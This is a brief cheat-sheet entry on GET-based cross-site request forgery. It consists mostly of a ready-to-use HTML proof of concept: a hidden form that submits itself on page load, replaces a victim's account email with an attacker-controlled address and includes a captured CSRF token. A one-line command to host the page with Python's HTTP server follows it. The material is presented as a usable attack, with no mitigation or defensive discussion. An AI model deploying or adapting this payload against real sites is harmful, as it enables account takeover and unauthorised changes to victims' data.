# Cross-Site Request Forgery (GET-based)
***
#### It is possible to extract CSRF tokens included in unencrypted requests

### Example:
```html
<html>
  <body>
    <form id="submit" action="http://[REAL_WEBSITE]/app/save/leet@example.com" method="GET">
      <input type="hidden" name="email" value="hackedby0xlightningg1337@fbi.org" />
      <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
      <input type="hidden" name="action" value="save" />
      <input type="hidden" name="csrf" value="11f7912d04b957022a6d3072be8ef67a41bia3e3" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.getElementById("submit").submit()
    </script>
  </body>
</html>
```

```bash
$ python3 -m http.server 1337
```